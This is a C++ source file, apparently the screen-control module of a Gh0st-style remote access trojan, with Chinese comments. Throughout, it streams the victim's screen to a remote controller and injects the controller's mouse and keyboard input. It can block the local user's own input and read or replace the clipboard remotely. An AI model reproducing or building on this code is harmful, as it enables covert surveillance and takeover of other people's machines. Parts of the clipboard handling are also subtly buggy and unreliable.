// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////
//#define _WIN32_WINNT	0x0400   //这里是要解决WM_MOUSEWHEEL不认识
#include "stdafx.h"
#include "ScreenManager.h"
#include "ClientSocket.h"
#include "Common.h"
#include <Winable.h>


#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_DIFF;   
	m_biBitCount = 32;    //每个所需要的位数  //32
	m_pScreenSpy = new CScreenSpy(32);     
	m_bIsWorking = true;
	m_bIsBlockInput = false;

	//ControlThread用于主控端对服务端的控制
	m_hWorkThread = MyCreateThread(NULL,0,
		(LPTHREAD_START_ROUTINE)WorkThread,this,0,NULL,true);
}

CScreenManager::~CScreenManager()
{

}


DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;
	
	pThis->sendBitMapInfo();         //发送bmp位图结构
	// 等控制端对话框打开
	
	pThis->WaitForDialogOpen();       //等待主控端的回应
	
	pThis->sendFirstScreen();         //发送第一帧的数据
	try // 控制端强制关闭时会出错
    {
		while (pThis->m_bIsWorking)
		{
		
			pThis->sendNextScreen();      //然后继续发送接下来的数据
		}
		
	}catch(...){};
	
	return 0;
}



void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
		switch (lpBuffer[0])
		{
		case COMMAND_NEXT:
			{
				NotifyDialogIsOpen();   // 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
				break;
			}
			
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			{
				m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];   //鼠标键盘的锁定

				BlockInput(m_bIsBlockInput);
				
				break;
				
			}

		case COMMAND_SCREEN_CONTROL:
			{
				//放开锁定
				BlockInput(false);
				ProcessCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);  //再回复成用户的设置


				break;
			}

		case COMMAND_SCREEN_GET_CLIPBOARD:
			{
				SendLocalClipboard();
				break;
			}
	
		case COMMAND_SCREEN_SET_CLIPBOARD:
			{
				UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
				break;
			}
		
			
		default:
			break;
		}
	}catch(...){}
}










void CScreenManager::sendBitMapInfo()
{

	//这里得到bmp结构的大小
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	//这里将bmp位图结构发送出去
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
}




void CScreenManager::sendFirstScreen()
{
   	//类CScreenSpy的getFirstScreen函数中得到图像数据
	//然后用getFirstImageSize得到数据的大小然后发送出去
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;
	
	lpFirstScreen = m_pScreenSpy->getFirstScreen();  
	if (lpFirstScreen == NULL)
		return;
	
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	
	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);
	
	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}


void CScreenManager::sendNextScreen()
{
   	//得到数据，得到数据大小，然后发送
	//我们到getNextScreen函数的定义 
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
	{
	
		return;
	}
	
	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);
	
	
	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	// 数据包不合法
	if (nSize % sizeof(MSG) != 0)
		return;
	
	SwitchInputDesktop();
	
	// 命令个数
	int	nCount = nSize / sizeof(MSG);   //
	
	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
			{
				POINT point;
				point.x = LOWORD(pMsg->lParam);
				point.y = HIWORD(pMsg->lParam);
				SetCursorPos(point.x, point.y);
				SetCapture(WindowFromPoint(point));
			}
			break;
		default:
			break;
		}
		
		switch(pMsg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
			break;	
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}	
}



void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT|CF_BITMAP);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}


void CScreenManager::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);  //DDE
	if (hglbCopy != NULL) { 
	
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);         
		SetClipboardData(CF_TEXT|CF_BITMAP, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}